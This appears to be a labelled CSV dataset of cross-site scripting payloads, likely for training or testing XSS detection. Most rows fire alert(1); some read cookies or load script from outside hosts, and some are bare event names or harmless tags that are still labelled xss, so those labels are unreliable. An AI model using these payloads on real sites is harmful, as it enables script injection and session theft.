Payloads,Types
<marquee onafterscriptexecute=alert(1)><script>1</script>,xss
"<style>:target {transform: rotate(180deg);}</style><mark id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></mark>",xss
<figure onbeforescriptexecute=alert(1)><script>1</script>,xss
<address onmousewheel=alert(1)>requires scrolling,xss
"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#",xss
"<video autoplay controls onwaiting=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",xss
<header id=x tabindex=1 onfocusin=alert(1)></header>,xss
"<animatemotion oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",xss
<keygen onpointerrawupdate=alert(1)>XSS</keygen>,xss
"<style>@keyframes slidein {}</style><ul style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></ul>",xss
"<colgroup onkeydown=""alert(1)"" contenteditable>test</colgroup>",xss
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></tfoot>",xss
<shadow onbeforescriptexecute=alert(1)><script>1</script>,xss
<xmp onpointerover=alert(1)>XSS</xmp>,xss
"<thead onbeforepaste=""alert(1)"" contenteditable>test</thead>",xss
"<keygen draggable=""true"" ondragstart=""alert(1)"">test</keygen>",xss
"<listing oncontextmenu=""alert(1)"">test</listing>",xss
"<legend onclick=""alert(1)"">test</legend>",xss
"<colgroup onmouseenter=""alert(1)"">test</colgroup>",xss
"<ul onkeypress=""alert(1)"" contenteditable>test</ul>",xss
"<div draggable=""true"" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>",xss
"<a href=""javascript:alert(1)"">ssss</a>",xss
"<ins onmousemove=""alert(1)"">test</ins>",xss
"<meta draggable=""true"" ondrag=""alert(1)"">test</meta>",xss
"<div onclick=""alert(1)"">test</div>",xss
"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>",xss
<acronym onpointerout=alert(1)>XSS</acronym>,xss
"<table draggable=""true"" ondragleave=""alert(1)"">test</table>",xss
<strike onpointerenter=alert(1)>XSS</strike>,xss
"<span onpaste=""alert(1)"" contenteditable>test</span>",xss
"<style>:target {color: red;}</style><body id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></body>",xss
"<style>@keyframes x{}</style><command style=""animation-name:x"" onanimationend=""alert(1)""></command>",xss
<nav id=x tabindex=1 onfocusin=alert(1)></nav>,xss
"<div draggable=""true"" contenteditable>drag me</div><xmp ondragover=alert(1) contenteditable>drop here</xmp>",xss
"<kbd draggable=""true"" ondrag=""alert(1)"">test</kbd>",xss
<nobr onpointerrawupdate=alert(1)>XSS</nobr>,xss
"<noscript onbeforecopy=""alert(1)"" contenteditable>test</noscript>",xss
"<style>@keyframes slidein {}</style><details style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></details>",xss
"<bdo onkeydown=""alert(1)"" contenteditable>test</bdo>",xss
<abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>,xss
<fieldset onmousewheel=alert(1)>requires scrolling,xss
"<summary onkeyup=""alert(1)"" contenteditable>test</summary>",xss
<listing onpointerup=alert(1)>XSS</listing>,xss
<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>,xss
"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>",xss
"<samp ondblclick=""alert(1)"" autofocus tabindex=1>test</samp>",xss
"<style>:target {color:red;}</style><tfoot id=x style=""transition:color 1s"" ontransitionend=alert(1)></tfoot>",xss
<map onpointerdown=alert(1)>XSS</map>,xss
"<track onmouseup=""alert(1)"">test</track>",xss
<html id=x tabindex=1 onactivate=alert(1)></html>,xss
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onwebkitanimationend=""alert(1)""></fieldset>",xss
<dfn onpointerout=alert(1)>XSS</dfn>,xss
<isindex id=x tabindex=1 ondeactivate=alert(1)></isindex><input id=y autofocus>,xss
ontouchend,xss
"<bdo onmouseout=""alert(1)"">test</bdo>",xss
"<plaintext onkeydown=""alert(1)"" contenteditable>test</plaintext>",xss
"<small onkeyup=""alert(1)"" contenteditable>test</small>",xss
<dir id=x tabindex=1 onfocus=alert(1)></dir>,xss
"<q draggable=""true"" ondragend=""alert(1)"">test</q>",xss
<nobr onmousewheel=alert(1)>requires scrolling,xss
"<blink onclick=""alert(1)"">test</blink>",xss
"<div draggable=""true"" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable>drop here</textarea>",xss
<b id=x tabindex=1 onfocusin=alert(1)></b>,xss
"<image onmousedown=""alert(1)"">test</image>",xss
"<XSS STYLE=""behavior: url(%(htc)s);"">",xss
"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionstart=alert(1)></slot>",xss
onInput,xss
<dir onpointerout=alert(1)>XSS</dir>,xss
"<param onmouseout=""alert(1)"">test</param>",xss
"<colgroup draggable=""true"" ondragleave=""alert(1)"">test</colgroup>",xss
<meta onpointerrawupdate=alert(1)>XSS</meta>,xss
"<animatemotion onkeypress=""alert(1)"" contenteditable>test</animatemotion>",xss
<col id=x tabindex=1 onfocus=alert(1)></col>,xss
"<style>:target {color:red;}</style><iframe id=x style=""transition:color 1s"" ontransitionend=alert(1)></iframe>",xss
<discard onpointerenter=alert(1)>XSS</discard>,xss
"<style>:target {transform: rotate(180deg);}</style><input4 id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></input4>",xss
<s onpointerover=alert(1)>XSS</s>,xss
"<style>:target {color:red;}</style><q id=x style=""transition:color 1s"" ontransitionend=alert(1)></q>",xss
<html id=x tabindex=1 onfocus=alert(1)></html>,xss
<animatetransform onpointerout=alert(1)>XSS</animatetransform>,xss
"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></rtc>",xss
<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>,xss
"<set onmouseleave=""alert(1)"">test</set>",xss
"<ins onbeforepaste=""alert(1)"" contenteditable>test</ins>",xss
"<div draggable=""true"" contenteditable>drag me</div><iframe2 ondrop=alert(1) contenteditable>drop here</iframe2>",xss
<main onpointerenter=alert(1)>XSS</main>,xss
"<style>@keyframes slidein {}</style><style style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></style>",xss
"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>",xss
<image3 onpointerleave=alert(1)>XSS</image3>,xss
"<details onmouseleave=""alert(1)"">test</details>",xss
"<listing onmouseover=""alert(1)"">test</listing>",xss
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,xss
<q id=x tabindex=1 onbeforeactivate=alert(1)></q>,xss
<param id=x tabindex=1 onfocus=alert(1)></param>,xss
<tt onpointerup=alert(1)>XSS</tt>,xss
"<frame draggable=""true"" ondragenter=""alert(1)"">test</frame>",xss
"<td onmousemove=""alert(1)"">test</td>",xss
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationend=""alert(1)""></source>",xss
<content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>,xss
"<style>@keyframes x{}</style><br style=""animation-name:x"" onanimationstart=""alert(1)""></br>",xss
<menuitem onmousewheel=alert(1)>requires scrolling,xss
&#x000003C,xss
<embed onfocusout=alert(1) tabindex=1 id=x></embed><input autofocus>,xss
<i id=x tabindex=1 onbeforedeactivate=alert(1)></i><input autofocus>,xss
"<form draggable=""true"" ondragstart=""alert(1)"">test</form>",xss
<optgroup onpointermove=alert(1)>XSS</optgroup>,xss
"<template onkeyup=""alert(1)"" contenteditable>test</template>",xss
"<style>:target {color:red;}</style><discard id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></discard>",xss
<!-- Up to Opera 11.64 - see link below -->,xss
<wbr onpointerenter=alert(1)>XSS</wbr>,xss
<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>,xss
"<nextid onbeforepaste=""alert(1)"" contenteditable>test</nextid>",xss
"<title draggable=""true"" ondragenter=""alert(1)"">test</title>",xss
"<style>:target {color:red;}</style><xmp id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></xmp>",xss
"<x 1="">"" onxxx=1",xss
"<input type=""submit"">",xss
"<menuitem onmouseenter=""alert(1)"">test</menuitem>",xss
<button onfocusout=alert(1) id=x></button><input autofocus>,xss
"<style>:target {color:red;}</style><thead id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></thead>",xss
"<ins onclick=""alert(1)"">test</ins>",xss
"""><script+src=""https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1edc_57a8d6de_38""></script>",xss
<details id=x tabindex=1 onfocusin=alert(1)></details>,xss
onMouseOut,xss
ondragstart,xss
"<animatemotion onmouseenter=""alert(1)"">test</animatemotion>",xss
"<dir onpaste=""alert(1)"" contenteditable>test</dir>",xss
<iframe autofocus onfocus=alert(1)>,xss
<meter onpointerleave=alert(1)>XSS</meter>,xss
"<div id=""64""><!DOCTYPE x[<!ENTITY x SYSTEM ""http://html5sec.org/test.xxe"">]><y>&x;</y>//[""'`-->]]>]</div><div id=""65""><svg onload=""javascript:alert(65)"" xmlns=""http://www.w3.org/2000/svg""></svg>//[""'`-->]]>]</div>",xss
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondrop=alert(1) contenteditable>drop here</colgroup>",xss
"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>,xss
"<video2 draggable=""true"" ondragstart=""alert(1)"">test</video2>",xss
"<ruby draggable=""true"" ondragend=""alert(1)"">test</ruby>",xss
<progress onpointerover=alert(1)>XSS</progress>,xss
<select onblur=alert(1) id=x></select><input autofocus>,xss
"<div draggable=""true"" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>",xss
"<source draggable=""true"" ondragend=""alert(1)"">test</source>",xss
"<style>@keyframes x{}</style><img style=""animation-name:x"" onwebkitanimationend=""alert(1)""></img>",xss
"<style>:target {color:red;}</style><dfn id=x style=""transition:color 1s"" ontransitionstart=alert(1)></dfn>",xss
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationstart=""alert(1)""></frameset>",xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></param>",xss
"<div draggable=""true"" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>",xss
<div onpointerleave=alert(1)>XSS</div>,xss
&#x003c;,xss
"<param draggable=""true"" ondrag=""alert(1)"">test</param>",xss
"<!--[if<img src=x onerror=alert(2)//]> -->//[""'`-->]]>]</div>",xss
<acronym onpointerdown=alert(1)>XSS</acronym>,xss
"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss
</template>,xss
"<small onpaste=""alert(1)"" contenteditable>test</small>",xss
onStop,xss
"<fieldset oncontextmenu=""alert(1)"">test</fieldset>",xss
<rt onpointerup=alert(1)>XSS</rt>,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><textarea id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></textarea>",xss
"<ruby onbeforepaste=""alert(1)"" contenteditable>test</ruby>",xss
onmessage,xss
"<pre onkeydown=""alert(1)"" contenteditable>test</pre>",xss
<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>,xss
"<rb onbeforecut=""alert(1)"" contenteditable>test</rb>",xss
<wbr onpointerrawupdate=alert(1)>XSS</wbr>,xss
<u onafterscriptexecute=alert(1)><script>1</script>,xss
"<style>@keyframes x{}</style><head style=""animation-name:x"" onanimationstart=""alert(1)""></head>",xss
"<menuitem ondblclick=""alert(1)"" autofocus tabindex=1>test</menuitem>",xss
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onwebkitanimationend=""alert(1)""></acronym>",xss
<noframes onbeforescriptexecute=alert(1)><script>1</script>,xss
"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></map>",xss
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationend=""alert(1)""></aside>",xss
"<div draggable=""true"" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>",xss
"<nobr onmouseup=""alert(1)"">test</nobr>",xss
"<SCRIPT SRC=""%(jpg)s""></SCRIPT>",xss
<header onpointermove=alert(1)>XSS</header>,xss
"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",xss
"<style>:target {color: red;}</style><iframe2 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></iframe2>",xss
onloadend,xss
"<style>@keyframes x{}</style><del style=""animation-name:x"" onanimationstart=""alert(1)""></del>",xss
"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",xss
"<div draggable=""true"" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>",xss
onwebkitanimationstart,xss
"<hr draggable=""true"" ondragstart=""alert(1)"">test</hr>",xss
"<menu onbeforecopy=""alert(1)"" contenteditable>test</menu>",xss
